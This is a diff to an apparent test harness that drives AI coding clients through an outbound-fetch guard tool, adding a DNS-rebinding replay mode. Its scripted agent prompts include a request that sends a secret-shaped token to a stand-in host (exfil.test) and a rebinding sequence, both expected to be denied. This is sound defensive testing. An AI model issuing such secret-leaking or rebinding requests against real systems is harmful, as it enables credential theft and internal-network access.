@@ -10,6 +10,7 @@ and compressed-body denials to the explicit native skill workflow.
 Set OUTBOUND_GUARD_CLIENT_DNS_SSRF=1 for private, mixed-answer and metadata
 DNS denials.
 Set OUTBOUND_GUARD_CLIENT_EXFIL=1 for a synthetic secret-shaped URL denial.
+Set OUTBOUND_GUARD_CLIENT_REBIND=1 for a two-call controlled DNS rebinding replay.
 Only one opt-in mode may be selected.
 """
 import sys,os,json,pathlib,subprocess,tempfile,time,threading,queue,shutil,hashlib,atexit
@@ -18,8 +19,9 @@ skill_zip=pathlib.Path(sys.argv[3]).resolve(strict=True) if len(sys.argv)==4 els
 attack_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_TRAPS')=='1'
 dns_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_DNS_SSRF')=='1'
 exfil_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_EXFIL')=='1'
-assert sum((attack_mode,dns_mode,exfil_mode))<=1, 'choose one opt-in skill replay mode'
-assert not (attack_mode or dns_mode or exfil_mode) or skill_zip, 'adversarial replay requires the explicit skill workflow'
+rebind_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_REBIND')=='1'
+assert sum((attack_mode,dns_mode,exfil_mode,rebind_mode))<=1, 'choose one opt-in skill replay mode'
+assert not (attack_mode or dns_mode or exfil_mode or rebind_mode) or skill_zip, 'adversarial replay requires the explicit skill workflow'
 synthetic_marker='ghp_'+'A'*20 if exfil_mode else None
 binary=str(pathlib.Path(sys.argv[2]).resolve(strict=True))
 script_dir=pathlib.Path(__file__).resolve().parent
@@ -79,6 +81,7 @@ assert (root/'ready').exists() and backend.poll() is None, 'fixture startup fail
 bridge=[str(script_dir/'client_wire_bridge.py'),ns,binary,str(root/'wire.jsonl')]
 if dns_mode:bridge.append('allowed.test,private.test,mixed.test,metadata.test')
 if exfil_mode:bridge.append('allowed.test,exfil.test')
+if rebind_mode:bridge.append('allowed.test,rebind.test')
 config=root/'mcp.json';config.write_text(json.dumps({'mcpServers':{'outbound_guard':{'command':'python3','args':bridge}}}))
 (root/'.cursor').mkdir(exist_ok=True)
 (root/'.cursor/mcp.json').write_text(config.read_text())
@@ -140,6 +143,10 @@ if skill_zip:
    skill_prompt='First invoke the outbound-guard skill using the Skill tool. In this disposable controlled fixture, use ONLY guarded_fetch for these four calls in order: GET http://127.0.0.1/ ; GET http://allowed.test/plain ; HEAD http://allowed.test/head-ok ; GET http://exfil.test/'+synthetic_marker+' . The last path is a synthetic test marker, not a real credential. The operator approved both exact DNS hosts for this negative test. Make every call once even when an earlier call is denied. Do not retry or use any other tool. Report the actual results.'
    expected_rules+=['EGRESS_SECRET_DETECTED']
    expected_methods+=['GET']
+  if rebind_mode:
+   skill_prompt='First invoke the outbound-guard skill using the Skill tool. In this disposable controlled DNS fixture, use ONLY guarded_fetch for these three calls in order: GET http://allowed.test/plain ; GET http://rebind.test/plain ; GET http://rebind.test/plain . The operator approved both exact DNS hosts for this negative security test. The rebind.test answer changes between calls. Make every call once, including the second rebind.test call even if the first succeeds. Do not retry or use any other tool. Report the actual results.'
+   expected_rules=['EGRESS_ALLOWED','EGRESS_ALLOWED','EGRESS_FORBIDDEN_ADDRESS']
+   expected_methods=['GET','GET','GET']
   if name=='claude':send({'type':'user','message':{'role':'user','content':skill_prompt}})
   elif name=='codex':
    send({'id':1,'method':'initialize','params':{'clientInfo':{'name':'outbound_skill_probe','version':'1'}}});response(1)
@@ -202,16 +209,16 @@ if skill_zip:
      'native_tool_statuses':[c.get('status') for c in calls.values()],
      'skill_path_seen':source in json.dumps(messages)}}),flush=True)
    assert reads,'native project skill read not observed'
-  if (attack_mode or dns_mode or exfil_mode) and name=='claude':
+  if (attack_mode or dns_mode or exfil_mode or rebind_mode) and name=='claude':
    deadline=time.monotonic()+40
    while time.monotonic()<deadline:
     messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
     if any(m.get('type')=='result' for m in messages):break
     time.sleep(.05)
    assert any(m.get('type')=='result' for m in messages), 'Claude skill turn did not complete'
-  elif (attack_mode or dns_mode or exfil_mode) and name=='cursor':
+  elif (attack_mode or dns_mode or exfil_mode or rebind_mode) and name=='cursor':
    response(3)
-  if attack_mode or dns_mode or exfil_mode:
+  if attack_mode or dns_mode or exfil_mode or rebind_mode:
    events=[json.loads(line) for line in (root/'wire.jsonl').read_text().splitlines()]
   fetches=[e for e in events if e.get('method')=='tools/call']
   if [e['http_method'] for e in fetches]!=expected_methods:
@@ -244,6 +251,14 @@ if skill_zip:
     print(json.dumps({'marker_diagnostic':[{k:e.get(k) for k in ('id','method','rule','synthetic_marker_echo')}
      for e in scanned if e['synthetic_marker_echo']]}),flush=True)
    assert scanned and not any(e['synthetic_marker_echo'] for e in scanned), 'synthetic marker echoed in MCP result'
+  if rebind_mode:
+   for _ in range(100):
+    rebind_a_queries=json.loads((root/'rebind.json').read_text())
+    if rebind_a_queries==2:break
+    time.sleep(.01)
+   assert rebind_a_queries==2, rebind_a_queries
+   hits=json.loads((root/'hits.json').read_text())
+   assert hits==['/plain','/plain'], hits
   print(json.dumps({'client':name,'native_skill_loaded':True,'native_skill_discovered':True if name=='codex' else None,'explicit_skill_input_accepted':True if name=='codex' else None,'native_turn_completed':True if name=='codex' else None,'native_skill_invoked':True if name=='claude' else None,
    'skill_tool_result_success':True if name=='claude' else None,'native_project_read_completed':True if name=='cursor' else None,
    'skill_zip_sha256':hashlib.sha256(skill_zip.read_bytes()).hexdigest(),
@@ -252,11 +267,12 @@ if skill_zip:
    'installation_scope':'temporary project '+str(skill_dir.relative_to(root)),
    'native_project_source_observed':True,'setting_sources':['project'] if name=='claude' else None,'builtin_tools':['Skill'] if name=='claude' else (['observed native read'] if name=='cursor' else None),
    'http_methods':[e['http_method'] for e in fetches], 'rules':[e['rule'] for e in events if 'rule' in e],
-   'status_codes':[200,200], 'attack_mode':attack_mode, 'dns_mode':dns_mode, 'exfil_mode':exfil_mode,
-   'fixture_hits':hits if (attack_mode or dns_mode or exfil_mode) else None,
+   'status_codes':[200,200], 'attack_mode':attack_mode, 'dns_mode':dns_mode, 'exfil_mode':exfil_mode, 'rebind_mode':rebind_mode,
+   'fixture_hits':hits if (attack_mode or dns_mode or exfil_mode or rebind_mode) else None,
    'forbidden_dns_names':sorted(set(dns_names)) if dns_mode else None,
    'exfil_dns_queried':'exfil.test' in dns_names if exfil_mode else None,
    'synthetic_marker_echo':False if exfil_mode else None,
+   'rebind_a_queries':rebind_a_queries if rebind_mode else None,
    'scope':'explicit named skill request; Claude Skill tool, Cursor project read, or Codex discovered skill input and completed turn; not automatic trigger reliability or proof of model adherence'}),flush=True)
  finally:cleanup()
  sys.exit(0)
